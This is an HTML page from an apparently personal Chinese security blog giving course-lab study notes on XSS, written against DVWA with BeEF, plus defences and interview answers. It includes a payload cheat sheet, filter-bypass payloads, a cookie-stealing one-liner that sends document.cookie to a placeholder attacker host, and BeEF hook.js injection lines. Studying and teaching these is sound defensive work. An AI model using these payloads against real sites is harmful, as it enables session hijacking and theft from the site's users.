@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web 安全：XSS 跨站脚本攻击 · pressure-J</title>
+<meta name="description" content="一句话原理：服务器把&quot;用户输入的数据&quot;和&quot;网页本身的代码&quot;不加区分地拼在一起返回给浏览器，浏览器把其中的 &lt;script&gt; 等标签当成合法程序执行——攻击者的 JavaScript 就在受害者的浏览器里运行了。">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/web-an-quan-xss-kua-zhan-jiao-ben-gong-ji.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Web 安全：XSS 跨站脚本攻击 · pressure-J">
+<meta property="og:description" content="一句话原理：服务器把&quot;用户输入的数据&quot;和&quot;网页本身的代码&quot;不加区分地拼在一起返回给浏览器，浏览器把其中的 &lt;script&gt; 等标签当成合法程序执行——攻击者的 JavaScript 就在受害者的浏览器里运行了。">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/web.html">Web 安全</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>Web 安全：XSS 跨站脚本攻击</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-web">Web 安全</span>
+          <time datetime="2026-08-28">2026-08-28</time>
+          <span>4323 字</span>
+          <span>约 11 分钟</span>
+        </div>
+        
+      </header>
+      <div class="content"><blockquote>
+<p>来源：课程实验《Web前后端编写及分析、JavaScript攻击与XSS攻击》（DVWA 平台 + BeeF 框架，2025-2026 第二学期）<br />
+定位：前端安全核心漏洞，OWASP Top 10 常年上榜；Web 前端开发与安全岗面试必问<br />
+实战场景：一切把用户输入原样输出到页面的功能（搜索框、留言板、URL 参数、语言切换）</p>
+</blockquote>
+<hr />
+<h2 id="_1">一、原理概述</h2>
+<p><strong>一句话原理</strong>：服务器把"用户输入的数据"和"网页本身的代码"不加区分地拼在一起返回给浏览器，浏览器把其中的 <code>&lt;script&gt;</code> 等标签当成<strong>合法程序</strong>执行——攻击者的 JavaScript 就在受害者的浏览器里运行了。</p>
+<p><strong>为什么能执行？</strong> 浏览器解析 HTML 时，遇到 <code>&lt;script&gt;</code>、<code>&lt;img onerror&gt;</code> 等标签标签里的代码会无条件执行。判断一段内容"是代码还是数据"的唯一依据是<strong>它出现在 HTML 的哪个位置</strong>，而不是"它是不是用户输入的"。所以只要服务器把用户输入原样塞进了 HTML 输出流，XSS 就成立了。</p>
+<p><strong>为什么危害这么大？</strong> 浏览器有一个安全边界叫<strong>同源策略（Same-Origin Policy）</strong>：一个页面的 JS 只能读写"同源"（协议+域名+端口一致）页面的数据。XSS 恰好<strong>绕过了同源策略</strong>——恶意 JS 是在受害者浏览器里、以受害网站的"身份"运行的，所以它有权读当前页面的 cookie、DOM、键盘输入。典型危害链：</p>
+<ol>
+<li><code>document.cookie</code> 窃取会话 → <strong>会话劫持</strong>，直接冒充受害者登录</li>
+<li>以受害者身份操作（改密码、转账、发帖）→ <strong>越权操作</strong></li>
+<li>存储型 XSS 会传染每个访问该页面的用户 → <strong>蠕虫式传播</strong></li>
+<li>钓鱼页面、键盘记录、配合 BeEF 把浏览器变成"僵尸"被远程遥控</li>
+</ol>
+<hr />
+<h2 id="_2">二、核心知识</h2>
+<h3 id="xss">三种 XSS 类型（面试第一必考点）</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>触发位置</th>
+<th>是否持久</th>
+<th>典型场景</th>
+<th>关键特征</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>反射型（Reflected）</strong></td>
+<td>服务器端，本次请求回显</td>
+<td>否（一次性）</td>
+<td>搜索框、URL 参数</td>
+<td>payload 在 URL/请求里，只影响点链接的人</td>
+</tr>
+<tr>
+<td><strong>存储型（Stored）</strong></td>
+<td>服务器端，先存数据库再输出</td>
+<td>是（持久）</td>
+<td>留言板、评论、用户名</td>
+<td>危害最大，所有访客都中招</td>
+</tr>
+<tr>
+<td><strong>DOM 型（DOM-based）</strong></td>
+<td>纯前端，不经过服务器</td>
+<td>由 URL 状态决定</td>
+<td>语言切换、URL 参数被 JS 读取</td>
+<td>服务器响应完全正常，靠前端 JS 的 sink 触发</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>核心区别一句话</strong>：反射型/存储型是<strong>服务器把输入输出到了 HTML</strong>；DOM 型是<strong>前端 JS 把 URL 参数写进了页面 DOM</strong>——服务器全程不知道有攻击发生。</p>
+<h3 id="payload">常用 Payload 速查</h3>
+<div class="code-block" data-lang="html"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>          <span class="cm">&lt;!-- 最直观的验证弹窗 --&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>                     <span class="cm">&lt;!-- 无 script 字样也能执行 --&gt;</span>
+<span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>                            <span class="cm">&lt;!-- 同上，另一个载体 --&gt;</span>
+<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"javascript:alert(1)"</span><span class="p">&gt;</span>点我<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>           <span class="cm">&lt;!-- 伪协议执行 --&gt;</span>
+<span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">"http://attacker/hook.js"</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>  <span class="cm">&lt;!-- 加载外部脚本（BeEF 挂钩） --&gt;</span>
+</code></pre></div></div>
+
+<p><strong>为什么 <code>&lt;img onerror&gt;</code> 能绕过 script 过滤</strong>：过滤规则通常只认得 <code>script</code> 字符串，而 <code>onerror</code> 事件处理器里照样能写任意 JS，载体标签换了，执行本质没变。<strong>记住：能触发 JS 的标签很多，防住 <code>&lt;script&gt;</code> 不等于防住 XSS。</strong></p>
+<h3 id="cookie">偷 Cookie 的标准姿势</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="s1">'http://攻击者IP:端口/c?='</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div></div>
+
+<p>原理：浏览器加载图片时会发起一个 GET 请求，把 cookie 拼在 URL 里发到攻击者服务器，攻击者这边起个 HTTP 服务（<code>nc -lvp 端口</code> 或 python http.server）就能收到。<strong>不做别的，只发一个请求，这就是"盲打"的思路。</strong></p>
+<h3 id="javascript">前端安全视野（实验中的 JavaScript 攻击）</h3>
+<p>实验第一部分（JavaScript 攻击）揭示了一类常见前端设计缺陷：页面用 JS 算法生成 token（如 <code>generate_token()</code>），且函数暴露在全局作用域、浏览器控制台直接可调用。攻击者要么看懂源码调函数，要么抓包把算法解码后在 Burp 里重算——<strong>前端的一切算法和密钥对用户都是透明的</strong>，所以安全校验必须放在后端。</p>
+<hr />
+<h2 id="_3">三、实操/利用流程（方法论）</h2>
+<h3 id="xss_1">反射型 XSS 利用五步</h3>
+<ol>
+<li><strong>找输入点</strong>：搜索框、URL 参数等"提交内容并回显"的位置</li>
+<li><strong>探针验证</strong>：输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，弹窗即确认可执行；不弹则逐个换 <code>&lt;img onerror&gt;</code>/大小写/编码</li>
+<li><strong>确定回显位置与拼接上下文</strong>：看源码确认输入被拼在标签属性里还是标签对之间，决定 payload 是否需要引号闭合</li>
+<li><strong>窃取会话</strong>：换成偷 cookie 的 payload，攻击者端监听端口等数据</li>
+<li><strong>扩大战果</strong>：拿到的 cookie 直接替换进浏览器（EditThisCookie 等）登录，完成会话劫持</li>
+</ol>
+<h3 id="xss-beef">存储型 XSS 利用（配合 BeEF）</h3>
+<ol>
+<li>在留言板/用户名字段注入 <code>&lt;script src="http://攻击者IP:3000/hook.js"&gt;&lt;/script&gt;</code></li>
+<li>数据入库后，<strong>每一个访问该页面的人</strong>都会加载 hook.js 被 BeEF 挂钩</li>
+<li>BeEF 控制台里看到在线"僵尸"浏览器，可执行偷 cookie、钓鱼弹窗、键盘记录、端口扫描等模块</li>
+</ol>
+<blockquote>
+<p>实验提示：存储型注入成功后数据进了数据库，每次刷新页面都会复现，测试完要重置数据库，否则影响后续实验。</p>
+</blockquote>
+<h3 id="dom-xss">DOM 型 XSS 利用</h3>
+<ol>
+<li>观察页面交互：选择语言/主题后 <strong>URL 出现变化</strong>（如 <code>?default=English</code>）</li>
+<li>在 URL 参数位直接注入 JS：<code>default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+<li>回车执行——<strong>payload 不经过服务器，服务器日志里什么都没有</strong></li>
+</ol>
+<hr />
+<h2 id="dvwa">四、绕过与进阶（DVWA 各难度思路）</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>级别</th>
+<th>过滤手段</th>
+<th>绕过 Payload</th>
+<th>思路本质</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Low</td>
+<td>无任何过滤</td>
+<td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td>直接打</td>
+</tr>
+<tr>
+<td>Medium</td>
+<td><code>str_replace</code> 替换 <code>&lt;script&gt;</code></td>
+<td><code>&lt;scr&lt;script&gt;ipt&gt;</code>（双写）、<code>&lt;SCript&gt;</code>（大小写）</td>
+<td>过滤是一次性替换，替换后剩下的部分重新拼成合法标签</td>
+</tr>
+<tr>
+<td>High</td>
+<td>正则过滤 script 标签</td>
+<td><code>&lt;img src=x onerror=alert(/xss/)&gt;</code></td>
+<td>换一个不包含 "script" 字样的执行载体</td>
+</tr>
+<tr>
+<td>DOM-Medium</td>
+<td>前端简单过滤 script</td>
+<td><code>&lt;img onerror=alert(1)&gt;</code></td>
+<td>同上，载体替换</td>
+</tr>
+<tr>
+<td>DOM-High</td>
+<td>变量被限制为固定四个值</td>
+<td><code>English&amp;para=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></td>
+<td>利用 PHP 与浏览器的解析差异，见下</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>DOM-High 的经典解析差异绕过（必懂）</strong>：后端 PHP 校验变量只能四选一，看起来堵死了。但 PHP 解析查询字符串时 <code>#</code> 之后的内容直接忽略；而前端 DOM 解析时仍会把 <code>&amp;para=...</code> 这个<strong>额外参数</strong>完整传给 JS，JS 拿到后用 <code>innerHTML</code> 写进页面 → 恶意标签在前端被执行。<strong>核心思想：服务器和浏览器对同一段 URL 的解析结果不同，攻击者利用"双方理解的缝隙"。</strong></p>
+<h3 id="_4">通用绕过思路（面试加分）</h3>
+<ul>
+<li><strong>过滤是黑名单就永远有漏</strong>：双写、大小写、编码（HTML 实体、URL 编码、Unicode）、换标签载体</li>
+<li><strong>拼接上下文决定闭合方式</strong>：输入进了标签属性就 <code>"&gt;&lt;script&gt;...</code>，进了 JS 字符串就 <code>';alert(1);//</code></li>
+<li>终极方案是<strong>白名单 + 输出编码</strong>，黑名单只能"堵已知"，白名单是"只放允许的"</li>
+</ul>
+<hr />
+<h2 id="_5">五、防御（面试必答，对应原理）</h2>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>攻击面</th>
+<th>防御手段</th>
+<th>对应原理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>输入</td>
+<td>输入校验 + 白名单（过滤）</td>
+<td>从源头拦截恶意内容</td>
+</tr>
+<tr>
+<td><strong>输出</strong></td>
+<td><strong>上下文相关编码</strong>：<code>htmlspecialchars()</code>（HTML 实体编码 <code>&lt;</code> <code>&gt;</code> <code>"</code> <code>'</code>）——注入内容被编码成纯文本，永远成不了标签</td>
+<td>这是 XSS 防御的<strong>根治点</strong>：不管输入多花哨，输出时一律当"文本"处理</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td><code>HttpOnly</code> 标志 → JS 读不到 <code>document.cookie</code></td>
+<td>限制 XSS 窃取会话，但治标不治本（XSS 还能干别的）</td>
+</tr>
+<tr>
+<td>全局兜底</td>
+<td><strong>CSP（Content-Security-Policy）</strong>：<code>script-src 'self'</code> 等白名单限制脚本来源</td>
+<td>即使 XSS 注入成功，浏览器也拒绝执行非白名单脚本</td>
+</tr>
+<tr>
+<td>开发侧</td>
+<td>现代前端框架（React/Vue）默认转义插值；后端模板引擎默认转义</td>
+<td>把"默认不安全"变成"默认安全"</td>
+</tr>
+<tr>
+<td>排查</td>
+<td>自动化扫描（xssstrike 等）+ 手工验证；<code>X-XSS-Protection</code> 已废弃，别当防御</td>
+<td>纵深防御，不依赖单一机制</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="_6">六、面试速答卡</h2>
+<ul>
+<li><strong>什么是 XSS</strong>：服务器把用户输入当代码输出，恶意 JS 在受害者浏览器执行</li>
+<li><strong>三种 XSS 区别</strong>：反射型一次性（服务器回显）、存储型进数据库（持久）、DOM 型纯前端不经过服务器</li>
+<li><strong>XSS 和 CSRF 区别</strong>：XSS 是"在受害者的浏览器里跑我的代码"；CSRF 是"借受害者的 Cookie 替他发请求"</li>
+<li><strong>为什么防住 <code>&lt;script&gt;</code> 还不够</strong>：<code>img onerror</code>、<code>svg onload</code>、伪协议等载体都能执行 JS</li>
+<li><strong>XSS 危害</strong>：偷 cookie 会话劫持、以受害者身份操作、存储型蠕虫传播、钓鱼键盘记录</li>
+<li><strong>前端校验为什么不可信</strong>：前端代码算法对用户完全透明，控制台随手可调，安全边界只能在后端</li>
+<li><strong>最有效的防御</strong>：输出编码（htmlspecialchars）+ 上下文编码 + CSP + HttpOnly 纵深组合</li>
+<li><strong>HttpOnly 的作用和局限</strong>：防 JS 读 cookie，但 XSS 仍可改页面、发请求，只是防止"会话被直接偷走"</li>
+</ul></div>
+      <div class="post-nav"><a class="pn-item prev" href="linux-fu-wu-dhcp-di-zhi-fen-pei.html"><span>← 上一篇</span><strong>Linux 服务：DHCP 地址分配</strong></a><a class="pn-item next" href="linux-fu-wu-nfs-wang-luo-wen-jian-xi-tong.html"><span>下一篇 →</span><strong>Linux 服务：NFS 网络文件系统</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#_1" class="toc-lv2">一、原理概述</a><a href="#_2" class="toc-lv2">二、核心知识</a><a href="#xss" class="toc-lv3">三种 XSS 类型（面试第一必考点）</a><a href="#payload" class="toc-lv3">常用 Payload 速查</a><a href="#cookie" class="toc-lv3">偷 Cookie 的标准姿势</a><a href="#javascript" class="toc-lv3">前端安全视野（实验中的 JavaScript 攻击）</a><a href="#_3" class="toc-lv2">三、实操/利用流程（方法论）</a><a href="#xss_1" class="toc-lv3">反射型 XSS 利用五步</a><a href="#xss-beef" class="toc-lv3">存储型 XSS 利用（配合 BeEF）</a><a href="#dom-xss" class="toc-lv3">DOM 型 XSS 利用</a><a href="#dvwa" class="toc-lv2">四、绕过与进阶（DVWA 各难度思路）</a><a href="#_4" class="toc-lv3">通用绕过思路（面试加分）</a><a href="#_5" class="toc-lv2">五、防御（面试必答，对应原理）</a><a href="#_6" class="toc-lv2">六、面试速答卡</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">在别处</div>
+      <a href="https://github.com/pressure-J" target="_blank" rel="noopener">GitHub</a>
+      <a href="mailto:1489955298@qq.com">Email</a>
+      <a href="../rss.xml">RSS</a>
+    </div>
+  </div>
+  <div class="wrap footer-bottom">
+    <span>© 2026 pressure-J</span>
+    <span class="footer-build">Build 2026-10-19 · Python + Markdown</span>
+  </div>
+</footer>
+<button class="to-top" id="to-top" type="button" aria-label="回到顶部">
+  <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 19V5M5 12l7-7 7 7"/></svg>
+</button>
+<script src="../assets/app.js" defer></script>
+</body>
+</html>
